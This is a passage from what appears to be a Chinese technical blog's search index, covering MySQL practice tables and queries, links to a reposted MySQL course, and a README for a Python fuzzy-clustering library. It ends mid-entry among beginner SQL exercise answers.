class="hljs-keyword">COMMENT</span> <span class="hljs-string">'出生年月'</span>,  <span class="hljs-string">`s_sex`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">10</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">''</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'学生性别'</span>,  PRIMARY <span class="hljs-keyword">KEY</span> (<span class="hljs-string">`s_id`</span>) <span class="hljs-keyword">USING</span> BTREE) <span class="hljs-keyword">ENGINE</span> = <span class="hljs-keyword">InnoDB</span> <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> = utf8 <span class="hljs-keyword">COLLATE</span> = utf8_general_ci ROW_FORMAT = <span class="hljs-keyword">Compact</span>;<span class="hljs-comment">-- 学生数据</span><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`student`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'01'</span>, <span class="hljs-string">'斯内克'</span>, <span class="hljs-string">'1990-01-01'</span>, <span class="hljs-string">'男'</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`student`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'02'</span>, <span class="hljs-string">'张益达'</span>, <span class="hljs-string">'1990-12-21'</span>, <span class="hljs-string">'男'</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`student`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'03'</span>, <span class="hljs-string">'张大炮'</span>, <span class="hljs-string">'1990-05-20'</span>, <span class="hljs-string">'男'</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`student`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'04'</span>, <span class="hljs-string">'李云龙'</span>, <span class="hljs-string">'1990-08-06'</span>, <span class="hljs-string">'男'</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`student`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'05'</span>, <span class="hljs-string">'楚云飞'</span>, <span class="hljs-string">'1991-12-01'</span>, <span class="hljs-string">'女'</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`student`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'06'</span>, <span class="hljs-string">'赵日天'</span>, <span class="hljs-string">'1992-03-01'</span>, <span class="hljs-string">'女'</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`student`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'07'</span>, <span class="hljs-string">'小甜甜'</span>, <span class="hljs-string">'1989-07-01'</span>, <span class="hljs-string">'女'</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`student`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'08'</span>, <span class="hljs-string">'王菊花'</span>, <span class="hljs-string">'1990-01-20'</span>, <span class="hljs-string">'女'</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`student`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'09'</span>, <span class="hljs-string">'李慕白'</span>, <span class="hljs-string">'1994-01-20'</span>, <span class="hljs-string">'男'</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`student`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'10'</span>, <span class="hljs-string">'东京热'</span>, <span class="hljs-string">'1980-01-20'</span>, <span class="hljs-string">'女'</span>);<span class="hljs-comment">-- 建立老师表</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">IF</span> <span class="hljs-keyword">EXISTS</span> <span class="hljs-string">`teacher`</span>;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`teacher`</span>  (  <span class="hljs-string">`t_id`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">''</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'教师编号'</span>,  <span class="hljs-string">`t_name`</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-string">''</span> <span class="hljs-keyword">COMMENT</span> <span class="hljs-string">'教师姓名'</span>,  PRIMARY <span class="hljs-keyword">KEY</span> (<span class="hljs-string">`t_id`</span>) <span class="hljs-keyword">USING</span> BTREE) <span class="hljs-keyword">ENGINE</span> = <span class="hljs-keyword">InnoDB</span> <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> = utf8 <span class="hljs-keyword">COLLATE</span> = utf8_general_ci ROW_FORMAT = <span class="hljs-keyword">Compact</span>;<span class="hljs-comment">-- 老师表数据</span><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`teacher`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'01'</span>, <span class="hljs-string">'墨白'</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`teacher`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'02'</span>, <span class="hljs-string">'默狐'</span>);<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> <span class="hljs-string">`teacher`</span> <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">'03'</span>, <span class="hljs-string">'柠檬'</span>);<span class="hljs-keyword">SET</span> FOREIGN_KEY_CHECKS = <span class="hljs-number">1</span>;</code></pre></div><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>1、查询”语文”课程比”数学”课程成绩高的学生的信息及课程分数 </p><div class="hljs code-wrapper"><pre><code class="hljs sql"></code></pre></div><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://cloud.tencent.com/developer/article/1540526" target="_blank" rel="noopener">SQL练习题共50道附答案（MySQL）——墨白的Java基地</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL45讲</title>
      <link href="/2021/03/29/MySQL45%E8%AE%B2/"/>
      <url>/2021/03/29/MySQL45%E8%AE%B2/</url>
      
        <content type="html"><![CDATA[<p>《MySQL45》讲转载，侵删</p><a id="more"></a><p>《MySQL45》讲转载，侵删</p><p><a href="https://sao-operation.gitee.io/my-sql45/01.基础架构：一条SQL查询语句是如何执行的？.html" target="_blank" rel="noopener">01.基础架构：一条SQL查询语句是如何执行的？.html        </a><br><a href="https://sao-operation.gitee.io/my-sql45/02.日志系统：一条SQL更新语句是如何执行的？.html" target="_blank" rel="noopener">02.日志系统：一条SQL更新语句是如何执行的？.html        </a><br><a href="https://sao-operation.gitee.io/my-sql45/03.事务隔离：为什么你改了我还看不见？.html" target="_blank" rel="noopener">03.事务隔离：为什么你改了我还看不见？.html             </a><br><a href="https://sao-operation.gitee.io/my-sql45/04.深入浅出索引（上）.html" target="_blank" rel="noopener">04.深入浅出索引（上）.html                             </a><br><a href="https://sao-operation.gitee.io/my-sql45/05.深入浅出索引（下）.html" target="_blank" rel="noopener">05.深入浅出索引（下）.html                             </a><br><a href="https://sao-operation.gitee.io/my-sql45/06.全局锁和表锁%20：给表加个字段怎么有这么多阻碍？.html" target="_blank" rel="noopener">06.全局锁和表锁 ：给表加个字段怎么有这么多阻碍？.html </a><br><a href="https://sao-operation.gitee.io/my-sql45/07.行锁功过：怎么减少行锁对性能的影响？.html" target="_blank" rel="noopener">07.行锁功过：怎么减少行锁对性能的影响？.html           </a><br><a href="https://sao-operation.gitee.io/my-sql45/08.事务到底是隔离的还是不隔离的？.htmla" target="_blank" rel="noopener">08.事务到底是隔离的还是不隔离的？.htmla                </a><br><a href="https://sao-operation.gitee.io/my-sql45/09.普通索引和唯一索引，应该怎么选择？.html" target="_blank" rel="noopener">09.普通索引和唯一索引，应该怎么选择？.html             </a><br><a href="https://sao-operation.gitee.io/my-sql45/10.MySQL为什么有时候会选错索引？.html" target="_blank" rel="noopener">10.MySQL为什么有时候会选错索引？.html                  </a><br><a href="https://sao-operation.gitee.io/my-sql45/11.怎么给字符串字段加索引？.html" target="_blank" rel="noopener">11.怎么给字符串字段加索引？.html                       </a><br><a href="https://sao-operation.gitee.io/my-sql45/12.为什么我的MySQL会" target="_blank" rel="noopener" 抖"一下？.html"="">12.为什么我的MySQL会“抖”一下？.html                    </a><br><a href="https://sao-operation.gitee.io/my-sql45/13.为什么表数据删掉一半，表文件大小不变？.html" target="_blank" rel="noopener">13.为什么表数据删掉一半，表文件大小不变？.html         </a><br><a href="https://sao-operation.gitee.io/my-sql45/14.count(×)这么慢，我该怎么办？.html" target="_blank" rel="noopener">14.count(×)这么慢，我该怎么办？.html                   </a><br><a href="https://sao-operation.gitee.io/my-sql45/15.答疑文章（一）：日志和索引相关问题.html" target="_blank" rel="noopener">15.答疑文章（一）：日志和索引相关问题.html             </a><br><a href="https://sao-operation.gitee.io/my-sql45/16." target="_blank" rel="noopener" order_by"是怎么工作的？(1).html"="">16.“order by”是怎么工作的？(1).html                    </a><br><a href="https://sao-operation.gitee.io/my-sql45/16." target="_blank" rel="noopener" order_by"是怎么工作的？.html"="">16.“order by”是怎么工作的？.html                       </a><br><a href="https://sao-operation.gitee.io/my-sql45/17.如何正确地显示随机消息？(1).html" target="_blank" rel="noopener">17.如何正确地显示随机消息？(1).html                    </a><br><a href="https://sao-operation.gitee.io/my-sql45/17.如何正确地显示随机消息？.html" target="_blank" rel="noopener">17.如何正确地显示随机消息？.html                       </a><br><a href="https://sao-operation.gitee.io/my-sql45/18.为什么这些SQL语句逻辑相同性能却差异巨大？.html" target="_blank" rel="noopener">18.为什么这些SQL语句逻辑相同性能却差异巨大？.html      </a><br><a href="https://sao-operation.gitee.io/my-sql45/18.为什么这些SQL语句逻辑相同，性能却差异巨大？.html" target="_blank" rel="noopener">18.为什么这些SQL语句逻辑相同，性能却差异巨大？.html    </a><br><a href="https://sao-operation.gitee.io/my-sql45/19.为什么我只查一行的语句也执行这么慢？.html" target="_blank" rel="noopener">19.为什么我只查一行的语句也执行这么慢？.html           </a><br><a href="https://sao-operation.gitee.io/my-sql45/19.为什么我只查一行的语句，也执行这么慢？.html" target="_blank" rel="noopener">19.为什么我只查一行的语句，也执行这么慢？.html         </a><br><a href="https://sao-operation.gitee.io/my-sql45/20.幻读是什么幻读有什么问题？.html" target="_blank" rel="noopener">20.幻读是什么幻读有什么问题？.html                     </a><br><a href="https://sao-operation.gitee.io/my-sql45/21.为什么我只改一行的语句锁这么多？.html" target="_blank" rel="noopener">21.为什么我只改一行的语句锁这么多？.html               </a><br><a href="https://sao-operation.gitee.io/my-sql45/22.MySQL有哪些" target="_blank" rel="noopener" 饮鸩止渴"提高性能的方法？.html"="">22.MySQL有哪些“饮鸩止渴”提高性能的方法？.html          </a><br><a href="https://sao-operation.gitee.io/my-sql45/23.MySQL是怎么保证数据不丢的？.html" target="_blank" rel="noopener">23.MySQL是怎么保证数据不丢的？.html                    </a><br><a href="https://sao-operation.gitee.io/my-sql45/24.MySQL是怎么保证主备一致的？.html" target="_blank" rel="noopener">24.MySQL是怎么保证主备一致的？.html                    </a><br><a href="https://sao-operation.gitee.io/my-sql45/25.MySQL是怎么保证高可用的？.html" target="_blank" rel="noopener">25.MySQL是怎么保证高可用的？.html                      </a><br><a href="https://sao-operation.gitee.io/my-sql45/26.备库为什么会延迟好几个小时？.html" target="_blank" rel="noopener">26.备库为什么会延迟好几个小时？.html                   </a><br><a href="https://sao-operation.gitee.io/my-sql45/27.主库出问题了从库怎么办？.html" target="_blank" rel="noopener">27.主库出问题了从库怎么办？.html                       </a><br><a href="https://sao-operation.gitee.io/my-sql45/28.读写分离有哪些坑？.html" target="_blank" rel="noopener">28.读写分离有哪些坑？.html                             </a><br><a href="https://sao-operation.gitee.io/my-sql45/29.如何判断一个数据库是不是出问题了？.html" target="_blank" rel="noopener">29.如何判断一个数据库是不是出问题了？.html             </a><br><a href="https://sao-operation.gitee.io/my-sql45/30.答疑文章（二）：用动态的观点看加锁.html" target="_blank" rel="noopener">30.答疑文章（二）：用动态的观点看加锁.html             </a><br><a href="https://sao-operation.gitee.io/my-sql45/31.误删数据后除了跑路还能怎么办？.html" target="_blank" rel="noopener">31.误删数据后除了跑路还能怎么办？.html                 </a><br><a href="https://sao-operation.gitee.io/my-sql45/32.为什么还有kill不掉的语句？.html" target="_blank" rel="noopener">32.为什么还有kill不掉的语句？.html                     </a><br><a href="https://sao-operation.gitee.io/my-sql45/33.我查这么多数据会不会把数据库内存打爆？.html" target="_blank" rel="noopener">33.我查这么多数据会不会把数据库内存打爆？.html         </a><br><a href="https://sao-operation.gitee.io/my-sql45/34.到底可不可以使用join？.html" target="_blank" rel="noopener">34.到底可不可以使用join？.html                         </a><br><a href="https://sao-operation.gitee.io/my-sql45/35.join语句怎么优化？.html" target="_blank" rel="noopener">35.join语句怎么优化？.html                             </a><br><a href="https://sao-operation.gitee.io/my-sql45/36.为什么临时表可以重名？.html" target="_blank" rel="noopener">36.为什么临时表可以重名？.html                         </a><br><a href="https://sao-operation.gitee.io/my-sql45/37.什么时候会使用内部临时表？.html" target="_blank" rel="noopener">37.什么时候会使用内部临时表？.html                     </a><br><a href="https://sao-operation.gitee.io/my-sql45/38.都说InnoDB好那还要不要使用Memory引擎？.html" target="_blank" rel="noopener">38.都说InnoDB好那还要不要使用Memory引擎？.html         </a><br><a href="https://sao-operation.gitee.io/my-sql45/39.自增主键为什么不是连续的？.html" target="_blank" rel="noopener">39.自增主键为什么不是连续的？.html                     </a><br><a href="https://sao-operation.gitee.io/my-sql45/40.insert语句的锁为什么这么多？.html" target="_blank" rel="noopener">40.insert语句的锁为什么这么多？.html                   </a><br><a href="https://sao-operation.gitee.io/my-sql45/41.怎么最快地复制一张表？.html" target="_blank" rel="noopener">41.怎么最快地复制一张表？.html                         </a><br><a href="https://sao-operation.gitee.io/my-sql45/42.grant之后要跟着flush_privileges吗？.html" target="_blank" rel="noopener">42.grant之后要跟着flush privileges吗？.html            </a><br><a href="https://sao-operation.gitee.io/my-sql45/43.要不要使用分区表？.html" target="_blank" rel="noopener">43.要不要使用分区表？.html                             </a><br><a href="https://sao-operation.gitee.io/my-sql45/44.答疑文章（三）：说一说这些好问题.html" target="_blank" rel="noopener">44.答疑文章（三）：说一说这些好问题.html               </a><br><a href="https://sao-operation.gitee.io/my-sql45/45.自增id用完怎么办？.html" target="_blank" rel="noopener">45.自增id用完怎么办？.html                             </a><br><a href="https://sao-operation.gitee.io/my-sql45/IT视频学习网-www.itspxx.com.url" target="_blank" rel="noopener">IT视频学习网-www.itspxx.com.url                        </a><br><a href="https://sao-operation.gitee.io/my-sql45/开篇词.这一次，让我们一起来搞懂MySQL.html" target="_blank" rel="noopener">开篇词.这一次，让我们一起来搞懂MySQL.html              </a><br><a href="https://sao-operation.gitee.io/my-sql45/文档列表.bat" target="_blank" rel="noopener">文档列表.bat                                           </a><br><a href="https://sao-operation.gitee.io/my-sql45/更多精品教程-itspxx.com.url" target="_blank" rel="noopener">更多精品教程-itspxx.com.url                            </a><br><a href="https://sao-operation.gitee.io/my-sql45/本教程由IT视频学习网提供.url" target="_blank" rel="noopener">本教程由IT视频学习网提供.url                           </a><br><a href="https://sao-operation.gitee.io/my-sql45/直播回顾.林晓斌：我的MySQL心路历程.html" target="_blank" rel="noopener">直播回顾.林晓斌：我的 MySQL 心路历程.html              </a><br><a href="https://sao-operation.gitee.io/my-sql45/结束语.点线网面一起构建MySQL知识网络.html" target="_blank" rel="noopener">结束语.点线网面一起构建MySQL知识网络.html              </a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>模糊聚类算法python版</title>
      <link href="/2021/03/27/%E6%A8%A1%E7%B3%8A%E8%81%9A%E7%B1%BB%E7%AE%97%E6%B3%95python%E7%89%88/"/>
      <url>/2021/03/27/%E6%A8%A1%E7%B3%8A%E8%81%9A%E7%B1%BB%E7%AE%97%E6%B3%95python%E7%89%88/</url>
      
        <content type="html"><![CDATA[<p>多种无监督和半监督的模糊聚类算法python实现</p><a id="more"></a><h2 id="introduce"><a href="#introduce" class="headerlink" title="introduce"></a>introduce</h2><p>本开源项目为模糊聚类算法python代码，主要算法包括：</p><ul><li>FCM（模糊C均值算法）</li><li>MEC （极大熵模糊聚类算法）</li><li>KFCM（核模糊聚类算法）</li><li>SFCM （半监督模糊聚类算法）</li><li>eSFCM （基于信息熵的半监督模糊聚类算法）</li><li>SMUC （基于度量学习与信息熵的半监督模糊聚类算法）</li></ul><p>项目链接：<a href="https://github.com/ChoiNgai/FuzzyClustering" target="_blank" rel="noopener">https://github.com/ChoiNgai/FuzzyClustering</a></p><p>以这些算法为基础的相关论文可参考本人的谷歌学术主页：<a href="https://scholar.google.com/citations?view_op=list_works&amp;hl=zh-CN&amp;user=pYX8lisAAAAJ" target="_blank" rel="noopener">Wei Cai，Guangdong University of Technology</a></p><p>如有问题欢迎邮件一起探讨：<a href="mailto:caiwei-email@qq.com">caiwei-email@qq.com</a></p><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><ul><li>dataset：数据集</li><li>ClusterAidedComputing.py ：包括聚类常用的一些函数</li><li>ClusteringIteration.py ：包括聚类算法迭代式</li><li>FuzzyClustering.py ：模糊聚类算法</li><li>demo.py ： 演示脚本（运行此程序）</li></ul><p>算法都封装在FuzzyClustering.py里，FuzzyClustering.py调用ClusterAidedComputing.py和ClusteringIteration.py</p><h2 id="算法调用"><a href="#算法调用" class="headerlink" title="算法调用"></a>算法调用</h2><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>（以下为所有模糊聚类算法都有的参数）</p><p>data ：数据集，统一使用数组（darry）</p><p>cluster_n ：类簇中心数 </p><p>max_iter ：最大迭代次数</p><p>e ：目标函数值变化最小阈值</p><p>printOn ：打印迭代情况开关（当printOn=1时打印迭代情况）</p><h3 id="调用规则"><a href="#调用规则" class="headerlink" title="调用规则"></a>调用规则</h3><p>所有的函数都需要输入data和cluster_n，其余参数可能有预设参数（若有预设参数则可以不输入，不输入则采用默认参数）</p><h3 id="算法函数"><a href="#算法函数" class="headerlink" title="算法函数"></a>算法函数</h3><ul><li>FCM</li></ul><div class="hljs code-wrapper"><pre><code class="hljs python">U,V,obj_fcn = fcm(data,cluster_n,m = <span class="hljs-number">2</span>,max_iter = <span class="hljs-number">1000</span>,e = <span class="hljs-number">0.00001</span>,printOn = <span class="hljs-number">1</span>)</code></pre></div><p>或</p><div class="hljs code-wrapper"><pre><code class="hljs python">U,V,obj_fcn = fcm(data,cluster_n)</code></pre></div><p>如上，m ,max_iter,e ,printOn这四个参数已有默认参数，可不设置 </p><ul><li>MEC</li></ul><div class="hljs code-wrapper"><pre><code class="hljs python">U,V,obj_fcn = mec(data,cluster_n,gamma=<span class="hljs-number">0.01</span>,max_iter = <span class="hljs-number">1000</span>,e = <span class="hljs-number">0.00001</span>,printOn = <span class="hljs-number">1</span>)</code></pre></div><p>gamma ：惩罚系数</p><ul><li><p>KFCM</p><p>sigma ：高斯核标准差</p><p>lamda ：惩罚系数</p></li></ul><div class="hljs code-wrapper"><pre><code class="hljs python">kfcm(data,cluster_n,sigma=<span class="hljs-number">2</span>,m=<span class="hljs-number">2</span>,lamda=<span class="hljs-number">0.1</span>,max_iter = <span class="hljs-number">1000</span>,e = <span class="hljs-number">0.00001</span>,printOn = <span class="hljs-number">1</span>)</code></pre></div><ul><li>SFCM</li></ul><div class="hljs code-wrapper"><pre><code class="hljs python">U,V,obj_fcn = sfcm(data,cluster_n,label,m = <span class="hljs-number">2</span>,max_iter = <span class="hljs-number">1000</span>,e = <span class="hljs-number">0.00001</span>,alpha=<span class="hljs-number">5</span>,printOn = <span class="hljs-number">1</span>)</code></pre></div><p>label ：标签（array格式）</p><ul><li>eSFCM</li></ul><div class="hljs code-wrapper"><pre><code class="hljs python">U,V,obj_fcn = esfcm(data,cluster_n,label,max_iter = <span class="hljs-number">1000</span>,e = <span class="hljs-number">0.00001</span>,lamda=<span class="hljs-number">1</span>,printOn = <span class="hljs-number">1</span>)</code></pre></div><ul><li>SMUC</li></ul><div class="hljs code-wrapper"><pre><code class="hljs smuc">U,V,obj_fcn = smuc(data,cluster_n,label,max_iter = 1000,e = 0.5,lamda=1,printOn = 1)</code></pre></div><h3 id="例"><a href="#例" class="headerlink" title="例"></a>例</h3><p>迭代目标函数值变化图：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/Figure_1.png" srcset="/img/loading.gif" lazyload="" alt="Figure_1">)<img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20210325193158437.png" srcset="/img/loading.gif" lazyload="" alt="image-20210325193158437"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 模糊聚类 </tag>
            
            <tag> 弱监督学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL练习</title>
      <link href="/2021/02/23/SQL%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/02/23/SQL%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>自学SQL网练习题</p><a id="more"></a><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>SQL是目前数据分析必备的技能，Hadoop生态中的Hive与SQL语法也几乎一样，所以入门数据分析，SQL是必须掌握的。因为如果连取数都不熟练甚至取数不准确，怎么做数据分析呢？</p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="Lesson0（体验）"><a href="#Lesson0（体验）" class="headerlink" title="Lesson0（体验）"></a>Lesson0（体验）</h3><p>SQL不多介绍了，练习内容来自<a href="http://xuesql.cn/" target="_blank" rel="noopener">自学SQL网</a>（侵删），题目答案均为自己写。</p><p>表格如下（表名 Movies ）：</p><table><thead><tr><th>Id</th><th>Title</th><th>Director</th><th>Year</th><th>Length_minutes</th></tr></thead><tbody><tr><td>1</td><td>Toy Story</td><td>John Lasseter</td><td>1995</td><td>81</td></tr><tr><td>2</td><td>A Bug’s Life</td><td>John Lasseter</td><td>1998</td><td>95</td></tr><tr><td>3</td><td>Toy Story 2</td><td>John Lasseter</td><td>1999</td><td>93</td></tr><tr><td>4</td><td>Monsters, Inc.</td><td>Pete Docter</td><td>2001</td><td>92</td></tr><tr><td>5</td><td>Finding Nemo</td><td>Finding Nemo</td><td>2003</td><td>107</td></tr><tr><td>6</td><td>The Incredibles</td><td>Brad Bird</td><td>2004</td><td>116</td></tr><tr><td>7</td><td>Cars</td><td>John Lasseter</td><td>2006</td><td>117</td></tr><tr><td>8</td><td>Ratatouille</td><td>Brad Bird</td><td>2007</td><td>115</td></tr><tr><td>9</td><td>WALL-E</td><td>Andrew Stanton</td><td>2008</td><td>104</td></tr><tr><td>10</td><td>Up</td><td>Pete Docter</td><td>2009</td><td>101</td></tr><tr><td>11</td><td>Toy Story 3</td><td>Lee Unkrich</td><td>2010</td><td>103</td></tr><tr><td>12</td><td>Cars 2</td><td>John Lasseter</td><td>2011</td><td>120</td></tr><tr><td>13</td><td>Brave</td><td>Brenda Chapman</td><td>2012</td><td>102</td></tr><tr><td>14</td><td>Monsters University</td><td>Dan Scanlon</td><td>2013</td><td>110</td></tr></tbody></table><p>练习 do it — 请完成如下任务</p><ol><li>【初体验】这是第一题,请你先将左侧的输入框里的内容清空，然后请输入下面的SQL，您将看到所有电影标题：<br><code>SELECT title FROM movies</code> </li><li>【初体验】请输入如下SQL你将看到4条电影（切记先清空数据框且出错要耐心比对）：<br><code>SELECT title,director FROM movies WHERE Id &lt; 5</code></li><li>【初体验】输入如下SQL你将看到电影总条数：<br><code>SELECT count(*) FROM movies</code></li><li>【初体验】SQL可以直接做计算，下面的SQL计算1+1的和,请输入：<br>SELECT 1+1</li></ol><p>1.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> title <span class="hljs-keyword">from</span> movies</code></pre></div><p>2.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> title,director <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> &lt;<span class="hljs-number">5</span></code></pre></div><p>3.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">count</span>(*) <span class="hljs-keyword">from</span> movies</code></pre></div><p>4.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>+<span class="hljs-number">1</span></code></pre></div><h3 id="Lesson1（查询）"><a href="#Lesson1（查询）" class="headerlink" title="Lesson1（查询）"></a>Lesson1（查询）</h3><p>表格与<strong>Lesson0</strong>相同</p><p>练习 do it — 请完成如下任务</p><ol><li>【简单查询】找到所有电影的名称<code>title</code></li><li>【简单查询】找到所有电影的导演</li><li>【简单查询】找到所有电影的名称和导演</li><li>【简单查询】找到所有电影的名称和上映年份</li><li>【简单查询】找到所有电影的所有信息</li><li>【简单查询】找到所有电影的名称,Id和播放时长</li></ol><p>1.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> title <span class="hljs-keyword">from</span> movies</code></pre></div><p>2、</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> director <span class="hljs-keyword">from</span> movies</code></pre></div><p>3.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> title,director <span class="hljs-keyword">from</span> movies</code></pre></div><p>4.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> title,<span class="hljs-keyword">year</span> <span class="hljs-keyword">from</span> movies</code></pre></div><p>5.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> movies</code></pre></div><p>6.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> title,<span class="hljs-keyword">id</span>,length_minutes <span class="hljs-keyword">from</span> movies</code></pre></div><h3 id="Lesson2-条件查询-constraints-Pt-1"><a href="#Lesson2-条件查询-constraints-Pt-1" class="headerlink" title="Lesson2 :条件查询 (constraints) (Pt. 1)"></a>Lesson2 :<strong>条件查询 (constraints) (Pt. 1)</strong></h3><p>表格与<strong>Lesson0</strong>相同</p><p>练习 do it — 请完成如下任务</p><ol><li>【简单条件】找到<code>id</code>为6的电影 ✓</li><li>【简单条件】找到在2000-2010年间<code>year</code>上映的电影</li><li>【简单条件】找到不是在2000-2010年间<code>year</code>上映的电影</li><li>【简单条件】找到头5部电影</li><li>【简单条件】找到2010（含）年之后的电影里片长小于两个小时的片子</li></ol><p>1.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">6</span></code></pre></div><p>2.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">where</span> <span class="hljs-keyword">year</span> <span class="hljs-keyword">between</span> <span class="hljs-number">2000</span> <span class="hljs-keyword">and</span> <span class="hljs-number">2010</span></code></pre></div><p>3.</p><div class="hljs code-wrapper"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> movies <span class="hljs-keyword">where</span> <span 